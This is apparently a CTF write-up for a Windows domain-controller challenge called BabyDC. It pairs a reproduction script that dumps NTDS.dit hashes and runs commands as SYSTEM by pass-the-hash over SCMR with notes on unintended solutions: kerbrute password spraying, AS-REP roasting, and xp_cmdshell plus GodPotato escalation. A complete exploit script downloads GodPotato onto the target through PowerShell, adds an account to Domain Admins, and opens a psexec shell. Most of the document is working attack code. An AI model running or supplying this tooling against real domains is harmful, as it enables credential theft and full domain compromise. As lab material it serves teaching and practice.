DEFAULT_OFFLINE_DIR = ROOT / "offline" / "hives"
DEFAULT_DUMP = ROOT / "artifacts_secretsdump.txt"
DEFAULT_WHOAMI = ROOT / "artifacts_system_whoami.txt"
DEFAULT_HOSTNAME = ROOT / "artifacts_system_hostname.txt"


def run_command(args, *, cwd=None, env=None, check=True, capture=True):
    proc = subprocess.run(
        args,
        cwd=cwd,
        env=env,
        check=False,
        capture_output=capture,
        text=True,
        encoding="utf-8",
        errors="backslashreplace",
    )
    if check and proc.returncode != 0:
        details = proc.stdout
        if proc.stderr:
            details = f"{details}\n{proc.stderr}" if details else proc.stderr
        raise RuntimeError(f"command failed ({proc.returncode}): {' '.join(map(str, args))}\n{details}".rstrip())
    return proc


def ensure_exists(path: Path, hint: str) -> None:
    if not path.exists():
        raise RuntimeError(f"missing required file: {path}\n{hint}")


def find_vboxmanage() -> Path:
    candidates = [
        Path(r"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe"),
        Path(r"C:\Program Files\ldplayer9box\VBoxManage.exe"),
    ]
    for candidate in candidates:
        if candidate.exists():
            return candidate
    found = shutil.which("VBoxManage.exe") or shutil.which("VBoxManage")
    if found:
        return Path(found)
    raise RuntimeError("VBoxManage.exe not found. Install VirtualBox 7.2.0 or adjust PATH.")


def find_wsl() -> Path:
    found = shutil.which("wsl.exe")
    if not found:
        raise RuntimeError("wsl.exe not found. WSL with kali-linux is required for virt-copy-out.")
    return Path(found)


def find_secretsdump(default_python: Path) -> Path:
    candidates = [
        default_python.parent / "Scripts" / "secretsdump.py",
        Path(r"D:\Python\Python311\Scripts\secretsdump.py"),
    ]
    for candidate in candidates:
        if candidate.exists():
            return candidate
    raise RuntimeError("secretsdump.py not found. Install impacket for the Python interpreter you will use.")


def vbox(vboxmanage: Path, vbox_home: Path, *args: str) -> subprocess.CompletedProcess:
    env = os.environ.copy()
    env["VBOX_USER_HOME"] = str(vbox_home)
    return run_command([str(vboxmanage), *args], env=env)


def convert_to_wsl_path(path: Path) -> str:
    full = path.resolve()
    drive = full.drive[:1].lower()
    rest = full.as_posix()[2:]
    return f"/mnt/{drive}{rest}"


def ensure_ova_extracted(ova: Path, ovf: Path, vmdk: Path) -> None:
    ensure_exists(ova, "Place the challenge OVA in the current directory.")
    if ovf.exists() and vmdk.exists():
        return
    run_command(["tar", "-xf", str(ova), ovf.name, vmdk.name], cwd=ova.parent)


def ensure_vdi(vboxmanage: Path, vmdk: Path, vdi: Path) -> None:
    if vdi.exists():
        return
    vdi.parent.mkdir(parents=True, exist_ok=True)
    run_command([str(vboxmanage), "clonemedium", "disk", str(vmdk), str(vdi), "--format", "VDI"])


def ensure_vm_registered(vboxmanage: Path, vbox_home: Path, vm_dir: Path, vdi: Path) -> None:
    vm_dir.mkdir(parents=True, exist_ok=True)
    vbox_home.mkdir(parents=True, exist_ok=True)
    vbox(vboxmanage, vbox_home, "list", "systemproperties")
    vm_list = vbox(vboxmanage, vbox_home, "list", "vms").stdout
    vmx = vm_dir / f"{VM_NAME}.vbox"
    if f'"{VM_NAME}"' not in vm_list:
        if vmx.exists():
            vbox(vboxmanage, vbox_home, "registervm", str(vmx))
        else:
            vbox(vboxmanage, vbox_home, "createvm", "--name", VM_NAME, "--basefolder", str(ROOT / "vm"), "--ostype", "Windows2019_64", "--register")
            vbox(
                vboxmanage,
                vbox_home,
                "modifyvm",
                VM_NAME,
                "--memory",
                "2048",
                "--cpus",
                "1",
                "--firmware",
                "bios",
                "--ioapic",
                "on",
                "--pae",
                "off",
                "--vram",
                "128",
                "--graphicscontroller",
                "vboxsvga",
                "--boot1",
                "disk",
                "--boot2",
                "dvd",
                "--boot3",
                "none",
                "--boot4",
                "none",
                "--audio",
                "none",
            )
            vbox(vboxmanage, vbox_home, "storagectl", VM_NAME, "--name", "SATA", "--add", "sata", "--controller", "IntelAhci")

    info = vbox(vboxmanage, vbox_home, "showvminfo", VM_NAME, "--machinereadable").stdout
    if '"SATA-0-0"="none"' in info:
        vbox(
            vboxmanage,
            vbox_home,
            "storageattach",
            VM_NAME,
            "--storagectl",
            "SATA",
            "--port",
            "0",
            "--device",
            "0",
            "--type",
            "hdd",
            "--medium",
            str(vdi),
        )


def ensure_nat_rules(vboxmanage: Path, vbox_home: Path) -> None:
    forwards = [
        "http,tcp,127.0.0.1,18080,,80",
        "ldap,tcp,127.0.0.1,10389,,389",
        "mssql,tcp,127.0.0.1,11433,,1433",
        "smb,tcp,127.0.0.1,10445,,445",
    ]
    info = vbox(vboxmanage, vbox_home, "showvminfo", VM_NAME, "--machinereadable").stdout
    for rule in forwards:
        name = rule.split(",", 1)[0]
        pattern = re.compile(rf'^Forwarding\(\d+\)="{re.escape(name)},', re.MULTILINE)
        if not pattern.search(info):
            vbox(vboxmanage, vbox_home, "modifyvm", VM_NAME, "--natpf1", rule)


def get_vm_state(vboxmanage: Path, vbox_home: Path) -> str:
    info = vbox(vboxmanage, vbox_home, "showvminfo", VM_NAME, "--machinereadable").stdout
    match = re.search(r'^VMState="([^"]+)"$', info, re.MULTILINE)
    return match.group(1) if match else "unknown"


def restart_vm(vboxmanage: Path, vbox_home: Path, boot_wait: int) -> None:
    state = get_vm_state(vboxmanage, vbox_home)
    if state == "running":
        vbox(vboxmanage, vbox_home, "controlvm", VM_NAME, "poweroff")
        time.sleep(3)
    vbox(vboxmanage, vbox_home, "startvm", VM_NAME, "--type", "headless")
    time.sleep(boot_wait)


def copy_offline_hives(wsl_exe: Path, work_root: Path, offline_dir: Path, distro: str, vmdk: Path) -> None:
    offline_dir.mkdir(parents=True, exist_ok=True)
    wsl_root = convert_to_wsl_path(work_root)
    wsl_vmdk = convert_to_wsl_path(vmdk)
    script = "\n".join(
        [
            "set -e",
            f"cd '{wsl_root}'",
            "mkdir -p offline/hives",
            f"virt-copy-out -a '{wsl_vmdk}' /Windows/NTDS/ntds.dit offline/hives/",
            f"virt-copy-out -a '{wsl_vmdk}' /Windows/System32/config/SYSTEM offline/hives/",
            f"virt-copy-out -a '{wsl_vmdk}' /Windows/System32/config/SECURITY offline/hives/",
        ]
    )
    run_command([str(wsl_exe), "-u", "root", "-d", distro, "--", "bash", "-lc", script])


def run_secretsdump(python_exe: Path, secretsdump: Path, offline_dir: Path, dump_path: Path) -> None:
    system_hive = offline_dir / "SYSTEM"
    security_hive = offline_dir / "SECURITY"
    ntds = offline_dir / "ntds.dit"
    ensure_exists(system_hive, "Offline SYSTEM hive is required.")
    ensure_exists(security_hive, "Offline SECURITY hive is required.")
    ensure_exists(ntds, "Offline NTDS.dit is required.")
    proc = run_command(
        [
            str(python_exe),
            str(secretsdump),
            "-system",
            str(system_hive),
            "-security",
            str(security_hive),
            "-ntds",
            str(ntds),
            "LOCAL",
        ]
    )
    dump_path.write_text(proc.stdout, encoding="utf-8")


def read_text_auto(path: Path) -> str:
    raw = path.read_bytes()
    for encoding in ("utf-8", "utf-16", "utf-16-le", "utf-16-be", "gbk"):
        try:
            return raw.decode(encoding)
        except UnicodeDecodeError:
            continue
    return raw.decode("utf-8", errors="ignore")


def extract_hash_line(dump_path: Path, account: str) -> str:
    pattern = re.compile(rf"{re.escape(account)}:\d+:[0-9a-fA-F]{{32}}:[0-9a-fA-F]{{32}}:::")
    for line in read_text_auto(dump_path).splitlines():
        match = pattern.search(line)
        if match:
            return match.group(0)
    raise RuntimeError(f"could not find hash line for {account} in {dump_path}")


def parse_hash_line(hash_line: str) -> tuple[str, str]:
    parts = hash_line.strip().split(":")
    if len(parts) < 4:
        raise RuntimeError(f"invalid hash line: {hash_line}")
    return parts[2], parts[3]


def random_tag(prefix: str, length: int = 8) -> str:
    return prefix + "".join(random.choice(string.ascii_letters) for _ in range(length))


def escape_for_cmd_echo(command: str) -> str:
    replacements = {
        "^": "^^",
        "&": "^&",
        "<": "^<",
        ">": "^>",
        "|": "^|",
    }
    escaped = []
    for char in command:
        escaped.append(replacements.get(char, char))
    return "".join(escaped)


def smbexec_one_shot(
    *,
    target_name: str,
    target_ip: str,
    smb_port: int,
    domain: str,
    username: str,
    password: str,
    lmhash: str,
    nthash: str,
    command: str,
) -> str:
    stringbinding = rf"ncacn_np:{target_name}[\pipe\svcctl]"
    rpc_transport = transport.DCERPCTransportFactory(stringbinding)
    rpc_transport.setRemoteHost(target_ip)
    rpc_transport.set_dport(smb_port)
    rpc_transport.set_credentials(username, password, domain, lmhash, nthash, None)

    dce = rpc_transport.get_dce_rpc()
    dce.connect()
    dce.bind(scmr.MSRPC_UUID_SCMR)

    smb_conn = rpc_transport.get_smb_connection()
    smb_conn.setTimeout(100000)

    scm_handle = scmr.hROpenSCManagerW(dce)["lpScHandle"]
    service_name = random_tag("svc")
    output_name = random_tag("out") + ".txt"
    batch_name = random_tag("job") + ".bat"
    output_path = rf"C:\Windows\Temp\{output_name}"
    batch_path = rf"C:\Windows\Temp\{batch_name}"
    batch_body = f"{escape_for_cmd_echo(command)} ^> {output_path} 2^>^&1"
    binary_path = (
        rf"C:\Windows\System32\cmd.exe /Q /c "
        rf"echo {batch_body} > {batch_path} & "
        rf"C:\Windows\System32\cmd.exe /Q /c {batch_path} & "
        rf"del {batch_path}"
    )

    service_handle = None
    try:
        resp = scmr.hRCreateServiceW(
            dce,
            scm_handle,
            service_name,
            service_name,
            lpBinaryPathName=binary_path,
            dwStartType=scmr.SERVICE_DEMAND_START,
        )
        service_handle = resp["lpServiceHandle"]
        try:
            scmr.hRStartServiceW(dce, service_handle)
        except Exception:
            pass

        time.sleep(1)

        last_error = None
        for _ in range(30):
            try:
                chunks = []

                def callback(data: bytes) -> None:
                    chunks.append(data)

                smb_conn.getFile("ADMIN$", rf"Temp\{output_name}", callback)
                output = b"".join(chunks).decode("utf-8", errors="backslashreplace")
                if output.strip():
                    smb_conn.deleteFile("ADMIN$", rf"Temp\{output_name}")
                    return output
            except Exception as exc:
                last_error = exc
            time.sleep(1)
        raise RuntimeError(f"timed out waiting for remote output file {output_name}: {last_error}")
    finally:
        if service_handle is not None:
            try:
                scmr.hRDeleteService(dce, service_handle)
            except Exception:
                pass
            try:
                scmr.hRCloseServiceHandle(dce, service_handle)
            except Exception:
                pass
        try:
            scmr.hRCloseServiceHandle(dce, scm_handle)
        except Exception:
            pass
        try:
            dce.disconnect()
        except Exception:
            pass


def extract_proof(output: str, command: str) -> str:
    cleaned = re.sub(r"[\x00-\x08\x0b-\x1f]", "", output)
    if command == "whoami":
        match = re.search(r"(?im)^\s*(nt authority\\system)\s*$", cleaned)
    elif command == "hostname":
        match = re.search(r"(?im)^\s*(CASTLEVANIA)\s*$", cleaned)
    else:
        match = None
    if not match:
        raise RuntimeError(f"failed to extract proof line for {command}")
    return match.group(1)


def verify_shell(
    *,
    dump_path: Path,
    hash_line: str | None,
    domain: str,
    username: str,
    target_name: str,
    target_ip: str,
    smb_port: int,
    whoami_path: Path,
    hostname_path: Path,
    retries: int,
    retry_delay: int,
) -> tuple[str, str]:
    if not hash_line:
        ensure_exists(dump_path, "Run the full mode first or provide --hash-line.")
        hash_line = extract_hash_line(dump_path, username)

    lmhash, nthash = parse_hash_line(hash_line)
    identity = f"{domain}/{username}@{target_name}"
    print(f"[*] principal : {identity}")
    print(f"[*] target ip : {target_ip}:{smb_port}")
    print(f"[*] hashes    : {lmhash}:{nthash}")

    def run_with_retry(command: str) -> str:
        last_error = None
        for attempt in range(1, retries + 1):
            try:
                return smbexec_one_shot(
                    target_name=target_name,
                    target_ip=target_ip,
                    smb_port=smb_port,
                    domain=domain,
                    username=username,
                    password="",
                    lmhash=lmhash,
                    nthash=nthash,
                    command=command,
                )
            except Exception as exc:
                last_error = exc
                if attempt == retries:
                    break
                print(f"[*] retry {attempt}/{retries - 1} for {command}: {exc}")
                time.sleep(retry_delay)
        raise RuntimeError(f"{command} failed after {retries} attempts: {last_error}")

    whoami_output = run_with_retry("whoami")
    whoami_path.write_text(whoami_output, encoding="utf-8")
    whoami = extract_proof(whoami_output, "whoami")
    print(f"[+] whoami    : {whoami}")

    hostname_output = run_with_retry("hostname")
    hostname_path.write_text(hostname_output, encoding="utf-8")
    hostname = extract_proof(hostname_output, "hostname")
    print(f"[+] hostname  : {hostname}")

    return whoami, hostname


def do_full(args) -> int:
    python_exe = args.python.resolve()
    vboxmanage = args.vboxmanage.resolve() if args.vboxmanage else find_vboxmanage()
    wsl_exe = args.wsl.resolve() if args.wsl else find_wsl()
    secretsdump = args.secretsdump.resolve() if args.secretsdump else find_secretsdump(python_exe)

    ensure_exists(python_exe, "Use a Python interpreter with impacket installed.")

    args.vbox_home.mkdir(parents=True, exist_ok=True)
    args.offline_dir.mkdir(parents=True, exist_ok=True)
    (ROOT / "vm").mkdir(parents=True, exist_ok=True)

    print("[*] extracting OVA if needed")
    ensure_ova_extracted(args.ova, args.ovf, args.vmdk)

    print("[*] preparing VDI")
    ensure_vdi(vboxmanage, args.vmdk, args.vdi)

    print("[*] registering VM")
    ensure_vm_registered(vboxmanage, args.vbox_home, args.vm_dir, args.vdi)

    print("[*] setting NAT forwards")
    ensure_nat_rules(vboxmanage, args.vbox_home)

    print("[*] starting VM")
    restart_vm(vboxmanage, args.vbox_home, args.boot_wait)

    print("[*] copying offline hives from VMDK")
    copy_offline_hives(wsl_exe, ROOT, args.offline_dir, args.wsl_distro, args.vmdk)

    print("[*] running secretsdump")
    run_secretsdump(python_exe, secretsdump, args.offline_dir, args.dump)

    print("[*] verifying Administrator shell")
    whoami, hostname = verify_shell(
        dump_path=args.dump,
        hash_line=args.hash_line,
        domain=args.domain,
        username=args.user,
        target_name=args.target,
        target_ip=args.target_ip,
        smb_port=args.smb_port,
        whoami_path=args.whoami_out,
        hostname_path=args.hostname_out,
        retries=args.verify_retries,
        retry_delay=args.verify_delay,
    )
    print(f"[+] complete   : {whoami} @ {hostname}")
    return 0


def do_verify(args) -> int:
    print("[*] verifying Administrator shell")
    whoami, hostname = verify_shell(
        dump_path=args.dump,
        hash_line=args.hash_line,
        domain=args.domain,
        username=args.user,
        target_name=args.target,
        target_ip=args.target_ip,
        smb_port=args.smb_port,
        whoami_path=args.whoami_out,
        hostname_path=args.hostname_out,
        retries=args.verify_retries,
        retry_delay=args.verify_delay,
    )
    print(f"[+] complete   : {whoami} @ {hostname}")
    return 0


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="One-file local reproduction script for BabyDC.")
    parser.add_argument("--python", type=Path, default=Path(sys.executable), help="Python interpreter with impacket installed")
    parser.add_argument("--domain", default="XMCVE.local")
    parser.add_argument("--user", default="Administrator")
    parser.add_argument("--target", default="CASTLEVANIA.XMCVE.local")
    parser.add_argument("--target-ip", default="127.0.0.1")
    parser.add_argument("--smb-port", type=int, default=10445)
    parser.add_argument("--dump", type=Path, default=DEFAULT_DUMP)
    parser.add_argument("--hash-line", help="Explicit secretsdump line, overrides --dump in verify mode")
    parser.add_argument("--whoami-out", type=Path, default=DEFAULT_WHOAMI)
    parser.add_argument("--hostname-out", type=Path, default=DEFAULT_HOSTNAME)
    parser.add_argument("--verify-retries", type=int, default=12, help="Retry count for post-boot shell validation")
    parser.add_argument("--verify-delay", type=int, default=5, help="Seconds between shell validation retries")

    subparsers = parser.add_subparsers(dest="mode", required=True)

    full = subparsers.add_parser("full", help="Extract the disk, boot the VM, dump hashes, and verify SYSTEM execution")
    full.add_argument("--ova", type=Path, default=DEFAULT_OVA)
    full.add_argument("--ovf", type=Path, default=DEFAULT_OVF)
    full.add_argument("--vmdk", type=Path, default=DEFAULT_VMDK)
    full.add_argument("--vm-dir", type=Path, default=DEFAULT_VM_DIR)
    full.add_argument("--vdi", type=Path, default=DEFAULT_VDI)
    full.add_argument("--vbox-home", type=Path, default=DEFAULT_VBOX_HOME)
    full.add_argument("--offline-dir", type=Path, default=DEFAULT_OFFLINE_DIR)
    full.add_argument("--vboxmanage", type=Path, help="Override VBoxManage.exe")
    full.add_argument("--wsl", type=Path, help="Override wsl.exe")
    full.add_argument("--wsl-distro", default="kali-linux")
    full.add_argument("--secretsdump", type=Path, help="Override secretsdump.py")
    full.add_argument("--boot-wait", type=int, default=25, help="Seconds to wait after starting the VM")
    full.set_defaults(func=do_full)

    verify = subparsers.add_parser("verify", help="Use the dump or a hash line to prove SYSTEM execution")
    verify.set_defaults(func=do_verify)

    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()
    return args.func(args)


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise

```

## 弱口令
> 出这个靶机实际上部分参考了xen-prolabs，当时随手设了几个干扰账户.....忘记修改为强密码了
>
> 导致可以越掉IIS，MSSQL，SMTP的Swaks欺骗三个考点，直接拿mowen账号来Backup Operators
>
> 俩名选手采用该方法解出题目
>

### <font style="color:rgb(51, 51, 51);">1. 用户枚举与口令喷洒</font>
<font style="color:rgb(51, 51, 51);">先用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">kerbrute</font>`<font style="color:rgb(51, 51, 51);"> 跑一轮常见用户名：</font>

kerbrute userenum -d XMCVE.local --dc 192.168.56.105 /usr/share/seclists/Usernames/top-usernames-shortlist.txt

<font style="color:rgb(51, 51, 51);">命中的有效用户包括：</font>

```plain
admin
sales
support
administrator
Admin
alucard
```

<font style="color:rgb(51, 51, 51);">接着做一轮最常见弱口令喷洒：</font>

kerbrute passwordspray -d XMCVE.local --dc 192.168.56.105 valid_users.txt 'Password123!'

<font style="color:rgb(51, 51, 51);">命中结果：</font>

```plain
admin:Password123!
sales:Password123!
support:Password123!
Admin:Password123!
```

<font style="color:rgb(51, 51, 51);">这一步只拿到了普通域账号，没有直接管理权限。</font>

### <font style="color:rgb(51, 51, 51);">2. BloodHound 找真正突破口</font>
<font style="color:rgb(51, 51, 51);">用已知凭据采集 BloodHound 数据：</font>

<font style="color:rgb(51, 51, 51);">bloodhound-python -u admin -p 'Password123!' -d XMCVE.local -dc CASTLEVANIA.XMCVE.local -ns 192.168.56.105 -c All --zip</font>

<font style="color:rgb(51, 51, 51);">在采集结果里，关键用户是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">MOWEN@XMCVE.LOCAL</font>`<font style="color:rgb(51, 51, 51);">。</font>

<font style="color:rgb(51, 51, 51);">已验证到的关键属性：</font>

```plain
dontreqpreauth: true
serviceprincipalnames: HTTP/CASTLEVANIA.XMCVE.local
member of: BACKUP OPERATORS
```

<font style="color:rgb(51, 51, 51);">同时还能看到：</font>

<font style="color:rgb(51, 51, 51);">ALUCARD@XMCVE.LOCAL -> member of local Administrators</font>

<font style="color:rgb(51, 51, 51);">但 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">alucard</font>`<font style="color:rgb(51, 51, 51);"> 当前没有口令，暂时走不通。</font>

<font style="color:rgb(51, 51, 51);">因此最优路径变成：</font>

+ <font style="color:rgb(51, 51, 51);">先打 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 的 AS-REP Roast</font>
+ <font style="color:rgb(51, 51, 51);">再利用其 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`<font style="color:rgb(51, 51, 51);"> 权限打域控</font>

---

### <font style="color:rgb(51, 51, 51);">3. AS-REP Roast 拿下 mowen</font>
<font style="color:rgb(51, 51, 51);">因为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 开启了“不需要预认证”，可以直接请求 AS-REP：</font>

<font style="color:rgb(51, 51, 51);">impacket-GetNPUsers XMCVE.local/mowen -dc-ip 192.168.56.105 -no-pass -request</font>

<font style="color:rgb(51, 51, 51);">拿到哈希后用 John 爆破：</font>

```plain
john mowen.asrep --wordlist=/usr/share/wordlists/rockyou.txt
john --show mowen.asrep
```

<font style="color:rgb(51, 51, 51);">爆破结果：</font>

<font style="color:rgb(51, 51, 51);">mowen:1maxwell</font>

<font style="color:rgb(51, 51, 51);">至此得到可用凭据：</font>

<font style="color:rgb(51, 51, 51);">XMCVE.local\mowen : 1maxwell</font>

## <font style="color:rgb(51, 51, 51);">土豆提权</font>
> 通过Mssql的账户权限-SeImpersonatePrivilege进行土豆提权
>
> 三名选手采用该方法解出题目
>

### 手法一
#### <font style="color:rgb(51, 51, 51);">1. SQL 利用</font>
<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">通过wuwupor / lovlyBaby登录mssql</font>

<font style="color:rgb(51, 51, 51);">确认配置项时还能看到 linked server的</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">xp_cmdshell</font>`<font style="color:rgb(51, 51, 51);"> 已经开启：</font>

```plain
SELECT name, CAST(value_in_use AS int) AS value_in_use
FROM sys.configurations
WHERE name IN ('xp_cmdshell', 'Ole Automation Procedures', 'Ad Hoc Distributed Queries', 'clr enabled', 'remote access');
```

<font style="color:rgb(51, 51, 51);">于是可以直接通过 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_PUBLIC</font>`<font style="color:rgb(51, 51, 51);"> 执行系统命令：</font>

EXEC ('EXEC xp_cmdshell ''whoami''') AT POO_PUBLIC;

<font style="color:rgb(51, 51, 51);">返回身份是：</font>

xmcve\sqlsvc

<font style="color:rgb(51, 51, 51);">接着看权限：</font>

EXEC ('EXEC xp_cmdshell ''whoami /priv''') AT POO_PUBLIC;

<font style="color:rgb(51, 51, 51);">输出里最关键的一项是：</font>

SeImpersonatePrivilege    Enabled

<font style="color:rgb(51, 51, 51);">这说明 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 已经满足典型的本地提权条件，只差一条能把 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SeImpersonatePrivilege</font>`<font style="color:rgb(51, 51, 51);"> 用起来的链。这里直接使用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato</font>`<font style="color:rgb(51, 51, 51);">，它对 Windows Server 2019 可用。</font>

#### <font style="color:rgb(51, 51, 51);">2. 系统提权</font>
<font style="color:rgb(51, 51, 51);">利用思路非常直接：</font>

1. <font style="color:rgb(51, 51, 51);">用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">xp_cmdshell</font>`<font style="color:rgb(51, 51, 51);"> 下发 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato.exe</font>`
2. <font style="color:rgb(51, 51, 51);">让 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato</font>`<font style="color:rgb(51, 51, 51);"> 以 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);"> 身份执行一条命令</font>
3. <font style="color:rgb(51, 51, 51);">把已知明文口令的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc / Sql!2026</font>`<font style="color:rgb(51, 51, 51);"> 加进 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Domain Admins</font>`
4. <font style="color:rgb(51, 51, 51);">重新用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc / Sql!2026</font>`<font style="color:rgb(51, 51, 51);"> 发起网络登录，直接拿管理员级远程会话</font>

`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato</font>`<font style="color:rgb(51, 51, 51);"> 先用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">whoami</font>`<font style="color:rgb(51, 51, 51);"> 验证时，返回结果里已经能看到：</font>

CurrentUser: NT AUTHORITY\SYSTEM

<font style="color:rgb(51, 51, 51);">然后执行：</font>

```plain
net group "Domain Admins" sqlsvc /add /domain
```

<font style="color:rgb(51, 51, 51);">命令成功后，重新使用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc / Sql!2026</font>`<font style="color:rgb(51, 51, 51);"> 进行远程执行，就能拿到管理员级 shell。这里用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">psexec</font>`<font style="color:rgb(51, 51, 51);"> 验证，返回结果是：</font>

```plain
nt authority\system
CASTLEVANIA
```

<font style="color:rgb(51, 51, 51);">成功拿到admin shell</font>

#### <font style="color:rgb(51, 51, 51);">3.Exp</font>
<font style="color:rgb(51, 51, 51);">下面给出完整利用脚本。脚本会先连 SQL，确认 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_PUBLIC</font>`<font style="color:rgb(51, 51, 51);"> 可用，然后临时开启一个本地 HTTP 服务，把同目录中的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato.exe</font>`<font style="color:rgb(51, 51, 51);"> 下发到目标，执行提权，再自动调用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">psexec</font>`<font style="color:rgb(51, 51, 51);"> 拉起管理员 shell。</font>

```plain
import argparse
import contextlib
import functools
import http.server
import shutil
import socket
import socketserver
import subprocess
import sys
import threading
import time
from pathlib import Path

import pytds


def quote_sql(value: str) -> str:
    return value.replace("'", "''")


def get_local_ip_for_target(target_ip: str) -> str:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.connect((target_ip, 1433))
        return sock.getsockname()[0]
    finally:
        sock.close()


class QuietHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, fmt: str, *args) -> None:
        pass


class ThreadingHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


@contextlib.contextmanager
def serve_directory(directory: Path, host: str):
    handler = functools.partial(QuietHandler, directory=str(directory))
    server = ThreadingHTTPServer((host, 0), handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield server.server_address[1]
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=1)


class MSSQLExploit:
    def __init__(self, server: str, user: str, password: str, database: str = "master", port: int = 1433):
        self.conn = pytds.connect(
            server=server,
            database=database,
            user=user,
            password=password,
            port=port,
            validate_host=False,
            use_tz=False,
            autocommit=True,
        )

    def close(self) -> None:
        self.conn.close()

    def run_query(self, query: str):
        cur = self.conn.cursor()
        cur.execute(query)
        if not cur.description:
            return []
        rows = cur.fetchall()
        columns = [c[0] for c in cur.description]
        return [dict(zip(columns, row)) for row in rows]

    def xp_cmdshell_via_public(self, command: str):
        query = f"EXEC ('EXEC xp_cmdshell ''{quote_sql(command)}''') AT POO_PUBLIC"
        return self.run_query(query)


def print_rows(title: str, rows) -> None:
    print(f"\n=== {title} ===")
    if not rows:
        print("(no rows)")
        return
    for row in rows:
        print(row)


def ensure_psexec() -> str:
    candidates = [
        shutil.which("psexec.py"),
        str(Path(sys.executable).with_name("psexec.py")),
        str(Path(sys.executable).resolve().parent.parent / "Scripts" / "psexec.py"),
    ]
    for candidate in candidates:
        if candidate and Path(candidate).exists():
            return candidate
    raise FileNotFoundError("psexec.py not found in PATH or next to the current Python installation.")


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit for codegate babydc.")
    parser.add_argument("--target", default="192.168.124.7")
    parser.add_argument("--sql-user", default="wuwupor")
    parser.add_argument("--sql-password", default="lovlyBaby")
    parser.add_argument("--domain", default="XMCVE")
    parser.add_argument("--pivot-user", default="sqlsvc")
    parser.add_argument("--pivot-password", default="Sql!2026")
    parser.add_argument("--command", default="cmd.exe", help="Command passed to psexec after sqlsvc becomes Domain Admin.")
    args = parser.parse_args()

    base_dir = Path(__file__).resolve().parent
    godpotato = base_dir / "GodPotato.exe"
    if not godpotato.exists():
        raise FileNotFoundError(f"Missing helper: {godpotato}")

    target_ip = args.target
    local_ip = get_local_ip_for_target(target_ip)
    print(f"[+] target: {target_ip}")
    print(f"[+] local callback IP: {local_ip}")

    sql = MSSQLExploit(target_ip, args.sql_user, args.sql_password)
    try:
        print_rows(
            "linked server context",
            sql.run_query(
                "EXEC ('SELECT @@SERVERNAME AS server_name, SYSTEM_USER AS current_login, "
                "IS_SRVROLEMEMBER(''sysadmin'') AS is_sysadmin') AT POO_PUBLIC"
            ),
        )
        print_rows("xp_cmdshell identity", sql.xp_cmdshell_via_public("whoami /priv"))

        with serve_directory(base_dir, "0.0.0.0") as port:
            download_cmd = (
                'powershell -c "try {(New-Object Net.WebClient).DownloadFile('
                f"'http://{local_ip}:{port}/{godpotato.name}',"
                "'C:\\Windows\\Temp\\GodPotato.exe');"
                'Write-Output OK} catch { Write-Output $_.Exception.Message }"'
            )
            print_rows("download helper", sql.xp_cmdshell_via_public(download_cmd))
            print_rows(
                "helper presence",
                sql.xp_cmdshell_via_public(
                    'powershell -c "Get-Item \'C:\\Windows\\Temp\\GodPotato.exe\' | '
                    'Select-Object Name,Length | Format-List"'
                ),
            )

        add_group_cmd = (
            'C:\\Windows\\Temp\\GodPotato.exe -cmd '
            f'"cmd /c net group \\"Domain Admins\\" {args.pivot_user} /add /domain"'
        )
        print_rows("godpotato group add", sql.xp_cmdshell_via_public(add_group_cmd))
        time.sleep(2)
    finally:
        sql.close()

    psexec = ensure_psexec()
    user_spec = f"{args.domain}/{args.pivot_user}:{args.pivot_password}@{target_ip}"
    cmd = [sys.executable, psexec, user_spec, args.command]
    print(f"[+] launching psexec: {' '.join(cmd)}")
    return subprocess.call(cmd)


if __name__ == "__main__":
    raise SystemExit(main())
```

### 手法二
#### <font style="color:rgb(51, 51, 51);">GodPotato</font>
